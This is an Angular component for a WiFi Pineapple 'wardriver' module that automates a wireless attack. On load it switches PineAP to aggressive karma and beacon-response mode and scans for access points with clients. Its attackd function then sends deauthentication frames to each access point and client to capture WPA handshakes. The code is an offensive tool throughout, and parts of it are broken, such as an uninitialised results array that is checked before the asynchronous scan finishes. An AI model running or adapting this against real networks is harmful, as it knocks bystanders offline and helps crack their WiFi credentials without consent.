import { Component, OnInit, NgModule } from '@angular/core'; 
import { ApiService } from '../services/api.service'; 
import { StatusRootObject, Header, Message } from '../interfaces/status.interface';
import { APResult } from '../interfaces/reconresult.interface';
import { exit } from 'process';
import { throws } from 'assert';

@Component({ 
    selector: 'lib-wardriver', 
    templateUrl: './wardriver.component.html', 
    styleUrls: ['./wardriver.component.css'] 
})

export class WarDriverComponent implements OnInit { 
    constructor(private API: ApiService) { }
    apiResponse = 'Unfulfilled Response';
    statusHeader: string = '';
    statusFileName: string = '';
    json_frontend: StatusRootObject;
    scanResultsArray: Array<APResult>;

    populateTargetBSSIDs(): void {
        this.API.APIGet('/api/pineap/ssids', (resp) => {
            this.apiResponse = resp.ssids;
        });
    }

    get_status_file_name(): string {
        this.API.request({
            module: 'wardriver',
            action: 'build_status_file',
        }, (resp) => {
            this.statusFileName = resp;
        })
        return this.statusFileName;
    }

    get_status_file(statusFileName: string): any {
        this.API.request({
            module: 'wardriver',
            action: 'get_status_file',
            file_name: this.statusFileName,
        }, (resp) => {
            let json_file: StatusRootObject = resp;
            this.json_frontend = json_file;
            console.log(json_file);
        })
    }

    get_status(): void {
        let statusFileName: string = this.get_status_file_name();
        this.get_status_file(statusFileName);
        //this.render_status();
    }
    attackd(): void {
        this.API.APIGet('/api/pineap/handshakes', (resp) => {  // start handshake capture
            if (resp.handshakes != null) {
                this.scanResultsArray.forEach(ap => {
                    let ap_deauth_payload = { // build ap deauth payload
                        bssid: ap.bssid,
                        multiplier: 1,
                        channel: 11,
                        clients: []
                    }
                    this.API.APIPost('/api/pineap/deauth/ap', ap_deauth_payload, (resp) => {  // deauth the ap
                        console.log('>ap deauthd: ' +ap.bssid)
                    }).forEach(client => {
                        let client_deauth_payload = {
                            bssid: ap.bssid,
                            mac: client.client_mac,
                            multiplier: 1,
                            channel: 11
                        }
                        this.API.APIPost('/api/pineap/deauth/client', client_deauth_payload, (resp) => {

                        });
                    });
                });
            }
        });
                        // deauth bssid
                        // loop through clients, deauth each
                        // stop handshakes
                        // check for handshakes               
    }
    
    run_scand(): void {
        const scan_opts = {
            "live":false,
            "scan_time":30,
            "band":"0"
        };

        const pineAP_aggro_settings = {
            'mode': 'advanced', 
            'settings': { 
                'ap_channel': '11', 
                'autostart': true,
                'autostartPineAP': true,
                'beacon_interval': 'AGGRESSIVE',
                'beacon_response_interval': 'AGGRESSIVE',
                'beacon_responses': true,
                'broadcast_ssid_pool': false,
                'capture_ssids': true,
                'connect_notifications': false,
                'disconnect_notifications': false,
                'enablePineAP': true,
                'karma': true,
                'logging': true,
                'pineap_mac': '5A:11:B0:A7:A9:09',
                'target_mac': 'FF:FF:FF:FF:FF:FF' 
            }
        }
        
        
        this.API.APIPut('/api/pineap/settings', pineAP_aggro_settings, (resp) => {
            this.API.APIPost('/api/recon/stop', null, (resp) => {
                this.API.APIPost('/api/recon/start', scan_opts, (resp) => {
                    // notify end user of 30 second wait
                    setTimeout(() => {  
                    this.API.APIGet('/api/recon/scans/' + resp.scanID, (resp) => {
                        console.log('>apr len: ' +resp.APResults.length);
                        if (resp.APResults.length > 0) {
                            resp.APResults.forEach(ap => {
                                if (ap.clients != null) {
                                    ap.clients.forEach(client => {
                                        console.log('>client found!: ' + client.client_mac);
                                        this.scanResultsArray.push(ap);
                                    });
                                }
                                else { console.log('>AP found, but not with associated clients'); }
                            });
                        }
                        else { console.log('>no APs found'); }
                    })}, 120000);
                
                this.API.APIPost('/api/recon/stop', null, (resp) => { }); 
            });
        });
    });    
    if (this.scanResultsArray.length > 0) this.attackd()
    else console.log('>sorry, nothing to attack');
}

    ngOnInit() { 
        this.populateTargetBSSIDs();
        //this.get_status();
        this.run_scand();
    } 
}